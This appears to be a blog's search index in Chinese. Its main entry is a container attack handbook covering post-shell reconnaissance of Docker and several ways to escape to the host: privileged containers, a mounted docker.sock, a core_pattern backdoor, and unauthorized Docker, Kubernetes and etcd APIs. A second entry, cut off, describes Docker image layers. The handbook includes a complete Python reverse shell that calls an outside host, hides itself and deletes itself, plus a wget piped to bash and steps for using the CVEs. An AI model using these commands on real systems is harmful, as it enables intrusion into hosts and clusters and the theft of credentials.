<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>容器攻击手册</title>
    <link href="/2023/03/31/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/"/>
    <url>/2023/03/31/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="一、getshell后如何判断是docker环境"><a href="#一、getshell后如何判断是docker环境" class="headerlink" title="一、getshell后如何判断是docker环境"></a>一、getshell后如何判断是docker环境</h2><h4 id="1-判断根目录下是否存在-dockerenv-文件"><a href="#1-判断根目录下是否存在-dockerenv-文件" class="headerlink" title="1.判断根目录下是否存在 .dockerenv 文件"></a>1.判断根目录下是否存在 .dockerenv 文件</h4><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCE6ecfcde32515ff7103ddd9874b711161.png"></p><h4 id="2-查看系统的cgroup系统："><a href="#2-查看系统的cgroup系统：" class="headerlink" title="2.查看系统的cgroup系统："></a>2.查看系统的cgroup系统：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;IS Docker&quot; || echo &quot;Not Docker&quot;<br></code></pre></td></tr></table></figure><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCE3239934053663305926e4b24278cc3cd.png"></p><h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><h4 id="1-用户识别：第一步需要确定是否是特权用户并识别其他用户。"><a href="#1-用户识别：第一步需要确定是否是特权用户并识别其他用户。" class="headerlink" title="1.用户识别：第一步需要确定是否是特权用户并识别其他用户。"></a>1.用户识别：第一步需要确定是否是特权用户并识别其他用户。</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用<span class="hljs-built_in">id</span>查看当前用户</span><br>id<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看/etc/passwd查看所有用户</span><br>cat /etc/passwd<br></code></pre></td></tr></table></figure><h4 id="2-识别容器的操作系统（或者Docker镜像）：因为容器使用宿主的内核，所以可以使用内核版本来标识宿主信息，从而检测一些内核利用。"><a href="#2-识别容器的操作系统（或者Docker镜像）：因为容器使用宿主的内核，所以可以使用内核版本来标识宿主信息，从而检测一些内核利用。" class="headerlink" title="2.识别容器的操作系统（或者Docker镜像）：因为容器使用宿主的内核，所以可以使用内核版本来标识宿主信息，从而检测一些内核利用。"></a>2.识别容器的操作系统（或者Docker镜像）：因为容器使用宿主的内核，所以可以使用内核版本来标识宿主信息，从而检测一些内核利用。</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">所有linux发行版都有/etc/os-release，其中包含了正在运行的操作系统的信息</span><br>cat /etc/os-release<br><span class="hljs-meta prompt_"># </span><span class="language-bash">还可以看看容器正在运行的进程</span><br>ps -A -o pid,cmd<br></code></pre></td></tr></table></figure><h4 id="3-读环境变量：环境变量是启动容器时与容器通信信息的一种方式。当一个容器启动时，环境变量被传递给它，这些变量通常包含密码和其他敏感信息。"><a href="#3-读环境变量：环境变量是启动容器时与容器通信信息的一种方式。当一个容器启动时，环境变量被传递给它，这些变量通常包含密码和其他敏感信息。" class="headerlink" title="3.读环境变量：环境变量是启动容器时与容器通信信息的一种方式。当一个容器启动时，环境变量被传递给它，这些变量通常包含密码和其他敏感信息。"></a>3.读环境变量：环境变量是启动容器时与容器通信信息的一种方式。当一个容器启动时，环境变量被传递给它，这些变量通常包含密码和其他敏感信息。</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用<span class="hljs-built_in">env</span>命令列出在docker中设置的所有环境变量，或者查看进程的/proc/lib/environment文件</span><br>env<br></code></pre></td></tr></table></figure><h4 id="4-检查Capabilities：通过查看-x2F-proc-x2F-self-x2F-status来查看容器的内核功能。其中CapEff是当前功能的值，可以使用capsh工具从十六进制值获取功能列表。可以使用这个来检查是否有可以用来容器逃逸的功能。"><a href="#4-检查Capabilities：通过查看-x2F-proc-x2F-self-x2F-status来查看容器的内核功能。其中CapEff是当前功能的值，可以使用capsh工具从十六进制值获取功能列表。可以使用这个来检查是否有可以用来容器逃逸的功能。" class="headerlink" title="4.检查Capabilities：通过查看&#x2F;proc&#x2F;self&#x2F;status来查看容器的内核功能。其中CapEff是当前功能的值，可以使用capsh工具从十六进制值获取功能列表。可以使用这个来检查是否有可以用来容器逃逸的功能。"></a>4.检查Capabilities：通过查看&#x2F;proc&#x2F;self&#x2F;status来查看容器的内核功能。其中CapEff是当前功能的值，可以使用capsh工具从十六进制值获取功能列表。可以使用这个来检查是否有可以用来容器逃逸的功能。</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts">grep Cap <span class="hljs-keyword">/proc/</span>self/status<br><span class="hljs-symbol">CapInh:</span> <span class="hljs-number">00000000</span>a80425fb  <span class="hljs-meta"># CapInh可继承能力是允许子进程获得的功能</span><br><span class="hljs-symbol">CapPrm:</span> <span class="hljs-number">00000000</span>a80425fb  <span class="hljs-meta"># CapPrm允许能力是一个进程可以使用的最大功能</span><br><span class="hljs-symbol">CapEff:</span> <span class="hljs-number">00000000</span>a80425fb  <span class="hljs-meta"># CapEff是进程有的功能</span><br><span class="hljs-symbol">CapBnd:</span> <span class="hljs-number">00000000</span>a80425fb <span class="hljs-meta"># CapBnd是调用树中允许的功能</span><br><span class="hljs-symbol">CapAmb:</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-meta"># CapAmb是非root子进程可以继承的功能</span><br></code></pre></td></tr></table></figure><h2 id="三、容器逃逸"><a href="#三、容器逃逸" class="headerlink" title="三、容器逃逸"></a>三、容器逃逸</h2><p>分为两种：利用配置错误实现逃逸、利用docker组件自身漏洞实现逃逸</p><h4 id="1-利用错误配置：利用特权容器"><a href="#1-利用错误配置：利用特权容器" class="headerlink" title="1.利用错误配置：利用特权容器"></a>1.利用错误配置：利用特权容器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/status | grep CapEff<br></code></pre></td></tr></table></figure><p>如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff</p><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCEd2895412ea26b2b72ab79b00659bc8f1.png"></p><p>若是以特权容器启动，就可以通过挂载宿主机磁盘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">df -h 或 fdisk -l                                  查看磁盘<br>mkdir /abc<br>mount /dev/sda5 /abc                               挂载磁盘<br>chroot /abc/                                       chroot之后就可以像访问本地文件一样，读取宿主机上的文件<br></code></pre></td></tr></table></figure><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCEb5b91ea9abb3c2ba3429d711af9bb7d6.png"></p><p>之后就可以写入公钥，ssh连接宿主机了。或者反弹shell</p><h4 id="2-利用错误配置：利用挂载Docker-Socket"><a href="#2-利用错误配置：利用挂载Docker-Socket" class="headerlink" title="2.利用错误配置：利用挂载Docker Socket"></a>2.利用错误配置：利用挂载Docker Socket</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Yes&quot; || echo &quot;No&quot;<br></code></pre></td></tr></table></figure><p>若挂在docker socket则ls &#x2F;var&#x2F;run&#x2F; | grep -qi docker.sock会有返回值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name docker.sock<br></code></pre></td></tr></table></figure><p>查找挂载路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H unix:///var/run/docker.sock info<br></code></pre></td></tr></table></figure><p>在容器中查看宿主机docker信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash<br></code></pre></td></tr></table></figure><p>运行一个新容器并挂载宿主机的根目录，计划任务写shell或写ssh秘钥。</p><h4 id="3-利用错误配置：利用挂载procfs"><a href="#3-利用错误配置：利用挂载procfs" class="headerlink" title="3.利用错误配置：利用挂载procfs"></a>3.利用错误配置：利用挂载procfs</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Yes&quot; || echo &quot;No&quot;<br></code></pre></td></tr></table></figure><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。此时就可以在挂载了procfs的容器中利用core_pattern后门实现容器逃逸。</p><p>wc -l是指用于计算字数显示行数。</p><p>编辑脚本.x.py放置在tmp目录中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>lhost = <span class="hljs-string">&quot;192.168.1.100&quot;</span><br>lport = <span class="hljs-number">10000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((lhost, lport))<br>    os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>    os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>    os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>    os.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>    pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>    os.remove(<span class="hljs-string">&#x27;/tmp/.x.py&#x27;</span>)<br>    s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>编辑崩溃程序crash.c放置在tmp目录中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *a = <span class="hljs-literal">NULL</span>;<br>    *a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后vps中nc监听即可。</p><p>这其中payload中使用空格加\r的方式，覆盖掉了真正的｜&#x2F;tmp&#x2F;.x.py。这样一来，即使管理员通过cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern的方式查看，也只能看到core；</p><p>&#x2F;tmp&#x2F;.x.py是一个隐藏文件，直接ls是看不到的；</p><p>os.remove(‘&#x2F;tmp&#x2F;.x.py’)在反弹shell的过程中删掉了用来反弹shell的程序自身；</p><p>按照上述语句操作，最终我们是无法获得预期效果的*。这是因为Linux转储机制对&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern内程序的查找是在宿主机文件系统进行的，而我们的&#x2F;tmp&#x2F;.x.py是容器内路径。可以在容器中先查看容器在宿主机中的真正位置</p><p>cat &#x2F;proc&#x2F;mounts | grep docker</p><p>然后改变payload即可使得程序在奔溃时能顺利找到容器内部的py文件了。</p><h4 id="4-利用错误配置：利用挂载主机根目录"><a href="#4-利用错误配置：利用挂载主机根目录" class="headerlink" title="4.利用错误配置：利用挂载主机根目录"></a>4.利用错误配置：利用挂载主机根目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name passwd 2&gt;/dev/null | grep /etc/passwd | wc -l | grep -q 7 &amp;&amp; echo &quot;Yes&quot; || echo &quot;No&quot;<br></code></pre></td></tr></table></figure><p>当容器挂载了宿主机根目录，就可以直接写计划任务或ssh秘钥。</p><p>利用错误配置：利用Docker remote api未授权访问（Docker-Swarm未授权访问致命令执行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">IP=`hostname -i | awk -F. &#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27; ` &amp;&amp; timeout 3 bash -c &quot;echo &gt;/dev/tcp/$IP/2375&quot; &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Yes&quot; || echo &quot;No&quot;<br></code></pre></td></tr></table></figure><p>这种情况其实是看服务器是否开起了docker的api且没有做限制</p><p>在使用Docker Swarm的时候，管理的Docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，其实这是 Docker Remote API，可以执行Docker命令，比如访问 <a href="http://host:2375/containers/json">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在Docker CLI上执行Docker ps的效果一样，其他操作比如创建&#x2F;删除container，拉取image等操作也都可以通过API调用完成。</p><p>此时只要用客户端去连接服务端即可（前提是两个版本要一样）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H tcp://x.x.x.x:2375 ps<br></code></pre></td></tr></table></figure><h4 id="5-利用docker组件自身漏洞：CVE-2019-5736-runC逃逸（会造成环境不可逆，且必须管理员exec进入此容器）"><a href="#5-利用docker组件自身漏洞：CVE-2019-5736-runC逃逸（会造成环境不可逆，且必须管理员exec进入此容器）" class="headerlink" title="5.利用docker组件自身漏洞：CVE-2019-5736 runC逃逸（会造成环境不可逆，且必须管理员exec进入此容器）"></a>5.利用docker组件自身漏洞：CVE-2019-5736 runC逃逸（会造成环境不可逆，且必须管理员exec进入此容器）</h4><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>Docker Version &lt; 18.09.2</p></li><li><p>RunC Version &lt;1.0-rc6</p></li><li><p>攻击者具有容器文件上传权限 &amp; 管理员使用exec访问容器 || 攻击者具有启动容器权限</p></li></ul><p>攻击者可以将容器中的目标文件替换成指向runC的自己的文件来欺骗runC执行自己。比如目标文件是&#x2F;bin&#x2F;bash，将它替换成指定解释器路径为#!&#x2F;proc&#x2F;self&#x2F;exe的可执行脚本，在容器中执行&#x2F;bin&#x2F;bash时将执行&#x2F;proc&#x2F;self&#x2F;exe，它指向host上的runC文件。然后攻击者可以继续写入&#x2F;proc&#x2F;self&#x2F;exe试图覆盖host上的runC文件。但是一般来说不会成功，因为内核不允许在执行runC时覆盖它。为了解决这个问题，攻击者可以使用O_PATH标志打开&#x2F;proc&#x2F;self&#x2F;exe的文件描述符，然后通过&#x2F;proc&#x2F;self&#x2F;fd&#x2F;<nr>使用O_WRONLY标志重新打开文件，并尝试在一个循环中从一个单独的进程写入该文件。当runC退出时覆盖会成功，在此之后，runC可以用来攻击其它容器或host。</p><h4 id="6-利用docker组件自身漏洞：CVE-2019-14271-Docker-cp漏洞致容器逃逸"><a href="#6-利用docker组件自身漏洞：CVE-2019-14271-Docker-cp漏洞致容器逃逸" class="headerlink" title="6.利用docker组件自身漏洞：CVE-2019-14271 Docker-cp漏洞致容器逃逸"></a>6.利用docker组件自身漏洞：CVE-2019-14271 Docker-cp漏洞致容器逃逸</h4><p><a href="https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271">https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271</a></p><h4 id="7-利用内核漏洞：CVE-2020-14386内核提权漏洞（暂未找到容器的漏洞复现）"><a href="#7-利用内核漏洞：CVE-2020-14386内核提权漏洞（暂未找到容器的漏洞复现）" class="headerlink" title="7.利用内核漏洞：CVE-2020-14386内核提权漏洞（暂未找到容器的漏洞复现）"></a>7.利用内核漏洞：CVE-2020-14386内核提权漏洞（暂未找到容器的漏洞复现）</h4><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>Ubuntu Bionic (18.04) and newer</p></li><li><p>Debian 9</p></li><li><p>Debian 10</p></li><li><p>CentOS 8&#x2F;RHEL 8</p></li></ul><p>CVE-2020-14386是内核af_packet模块中存在的内存溢出漏洞。漏洞触发需要CAP_NET_RAW权限。非Root用户没有该权限，但是在高版本Linux（内核版本高于4.6）上非特权用户能够创建user                     namespace，在该user namespace中会有CAP_NET_RAW权限。K8s或Docker容器默认具有CAP_NET_RAW权限，在高版本Linux中也存在触发该漏洞的可能。该漏洞能够允许攻击者实现越界写，能够写的长度为1~10个字节（来自漏洞发现者描述），可能造成提权或容器逃逸。</p><h4 id="8-利用docker组件自身漏洞：CVE-2020-15257Docker-Containerd漏洞致容器逃逸"><a href="#8-利用docker组件自身漏洞：CVE-2020-15257Docker-Containerd漏洞致容器逃逸" class="headerlink" title="8.利用docker组件自身漏洞：CVE-2020-15257Docker-Containerd漏洞致容器逃逸"></a>8.利用docker组件自身漏洞：CVE-2020-15257Docker-Containerd漏洞致容器逃逸</h4><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>containerd &lt; 1.4.3</p></li><li><p>containerd &lt; 1.3.9</p></li><li><p>使用hostnetwork网络模式启动容器 &amp;&amp; 使用root用户(UID:0)启动容器</p></li></ul><p>使用hostnetwork网络模式中，容器和主机共享网络命名空间，因此在容器内可以访问host特定的socket文件(shim.sock)。可通过启动一个新的容器，该容器挂在host目录到容器的&#x2F;host目录，即可实现对host完全的读写。</p><p><a href="https://github.com/Metarget/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257">https://github.com/Metarget/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257</a></p><h4 id="9-利用内核漏洞：CVE-2022-0847-DirtyPipe-逃逸"><a href="#9-利用内核漏洞：CVE-2022-0847-DirtyPipe-逃逸" class="headerlink" title="9.利用内核漏洞：CVE-2022-0847 DirtyPipe 逃逸"></a>9.利用内核漏洞：CVE-2022-0847 DirtyPipe 逃逸</h4><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>Linux Kernel版本 &gt;&#x3D; 5.8</p></li><li><p>Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102</p></li><li><p>CentOS 8 默认内核版本受该漏洞影响</p></li><li><p>CentOS 7 及以下版本不受影响</p></li></ul><p>工具：<a href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p><p>利用本漏洞将&#x2F;etc&#x2F;passwd文件内 root 密码修改为traitor, 借助于 pty（go 版本的伪终端【pseudo teminal】） 这个工具实现一键提权，效果比较稳定，如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./traitor-amd64 list<br>./traitor-amd64 -e kernel:CVE-2022-0847<br></code></pre></td></tr></table></figure><p><a href="https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2022-0847">https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2022-0847</a></p><h4 id="10-容器逃逸检测脚本"><a href="#10-容器逃逸检测脚本" class="headerlink" title="10.容器逃逸检测脚本"></a>10.容器逃逸检测脚本</h4><p>项目地址：<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><p>直接在容器中执行以下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://raw.githubusercontent.com/teamssix/container-escape-check/main/container-escape-check.sh -O -| bash<br></code></pre></td></tr></table></figure><p>不过大多容器可能没有 wget 命令，因此可以将脚本先克隆到本地，然后上传到容器再执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/teamssix/container-escape-check.git<br><span class="hljs-built_in">cd</span> container-escape-check<br><span class="hljs-built_in">chmod</span> +x container-escape-check.sh<br>./container-escape-check.sh<br></code></pre></td></tr></table></figure><h3 id="四、控制集群"><a href="#四、控制集群" class="headerlink" title="四、控制集群"></a>四、控制集群</h3><h4 id="1-利用k8s-api-server-8080未授权"><a href="#1-利用k8s-api-server-8080未授权" class="headerlink" title="1.利用k8s api-server 8080未授权"></a>1.利用k8s api-server 8080未授权</h4><p>k8s api server存在未授权访问，攻击者可通过kubectl创建恶意pod或控制已有pod，后续可尝试逃逸至宿主机 </p><p>访问默认8080端口，若存在以下回显，</p><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCE6d35cb267dfc2eaf06c4502941a133b7.webp"></p><h4 id="2-kubelet-10250未授权"><a href="#2-kubelet-10250未授权" class="headerlink" title="2.kubelet 10250未授权"></a>2.kubelet 10250未授权</h4><p>k8s node对外开启10250(kubelet API)和10255端口(readonly API)，攻击者可创建恶意pod或控制已有pod，后续可尝试逃逸至宿主机</p><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCEec8ed343fd4897a646747906d9541b31.webp"></p><h4 id="3-etcd未授权"><a href="#3-etcd未授权" class="headerlink" title="3.etcd未授权"></a>3.etcd未授权</h4><p>etcd若存在未授权，攻击者导出全量etcd配置，获取k8s认证证书等关键配置，进而通过kubectl创建恶意pod或控制已有pod，后续可尝试逃逸至宿主机</p><p>访问<a href="https://x.x.x.x:2379/v2/keys%EF%BC%8C%E6%9C%89%E5%A6%82%E4%B8%8B%E5%9B%9E%E6%98%BE%E5%88%99%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8">https://x.x.x.x:2379/v2/keys，有如下回显则漏洞存在</a></p><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCE8a115c1d3de91627f8ad1d75f9a30743.webp"></p><h4 id="4-CVE-2018-18264-k8s-dashboard认证绕过"><a href="#4-CVE-2018-18264-k8s-dashboard认证绕过" class="headerlink" title="4.CVE-2018-18264 k8s dashboard认证绕过"></a>4.CVE-2018-18264 k8s dashboard认证绕过</h4><p>攻击者可跳过登录，直接进入dashboard web页获取pod和job等状态，并可创建恶意pod，尝试逃逸至宿主机 </p><p>登录页面选择跳过登录 </p><p><img src="/%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%89%8B%E5%86%8C/WEBRESOURCE6bb18c9497c26d1d442acffda9aa0086.webp"></p><h4 id="5-kube-proxy配置错误"><a href="#5-kube-proxy配置错误" class="headerlink" title="5.kube-proxy配置错误"></a>5.kube-proxy配置错误</h4><p>攻击者可通过kube-proxy代理来未授权访问本地kube-apiserver组件，创建恶意pod或控制已有pod，后续可尝试逃逸至宿主机</p><p>请求8001端口即可未授权访问kube-apiserver</p>]]></content>
    
    
    
    <tags>
      
      <tag>云安全</tag>
      
      <tag>Docker</tag>
      
      <tag>攻防技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker镜像分析</title>
    <link href="/2023/03/27/Docker%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90/"/>
    <url>/2023/03/27/Docker%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、镜像结构："><a href="#一、镜像结构：" class="headerlink" title="一、镜像结构："></a>一、镜像结构：</h2><p><img src="/Docker%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90/WEBRESOURCEa8e683cbf4ef28ef1d0bad74d7888080.png" alt="WEBRESOURCEa8e683cbf4ef28ef1d0bad74d7888080"></p><p>镜像分为底层驱动bootfs，当成为容器启动后会被加载进入内存然后会被unmount掉，BaseImage为rootfs存储了系统根目录系统，出了writable层其他层都是不可写的只可读，当在容器态修改底层文件内容，docker文件驱动会将旧文件拷贝一份到writable层，然后下层文件进行屏蔽处理。启动镜像是读取子镜像层是由上至下读取的，保证读取的文件是最新的。</p><p>可以通过docker history命令来查看镜像层：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/containers/9f2244a9fd11c8dc53c43fb46fb7864e93afc28a4b491262a88dc9fe168e2367# docker history tomcat<br><span class="hljs-variable constant_">IMAGE</span>               <span class="hljs-variable constant_">CREATED</span>             <span class="hljs-variable constant_">CREATED</span> <span class="hljs-variable constant_">BY</span>                                      <span class="hljs-variable constant_">SIZE</span>                <span class="hljs-variable constant_">COMMENT</span><br>46cfbf1293b1        <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">&quot;catalina.sh&quot;</span> <span class="hljs-string">&quot;run&quot;</span>]    0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">EXPOSE</span> <span class="hljs-number">8080</span>                  0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c set -eux;  nativeLines=<span class="hljs-string">&quot;$(catalin…   0B                  </span><br><span class="hljs-string">&lt;missing&gt;           12 days ago         /bin/sh -c set -eux;   savedAptMark=&quot;</span>$(apt-m…   <span class="hljs-number">20.</span>3MB              <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">TOMCAT_SHA512</span>=06cd51a…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">TOMCAT_VERSION</span>=<span class="hljs-number">9.0</span><span class="hljs-number">.50</span>    0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">TOMCAT_MAJOR</span>=<span class="hljs-number">9</span>           0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">GPG_KEYS</span>=48F8E69F6390…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">LD_LIBRARY_PATH</span>=<span class="hljs-regexp">/usr/</span>…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">TOMCAT_NATIVE_LIBDIR</span>=…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         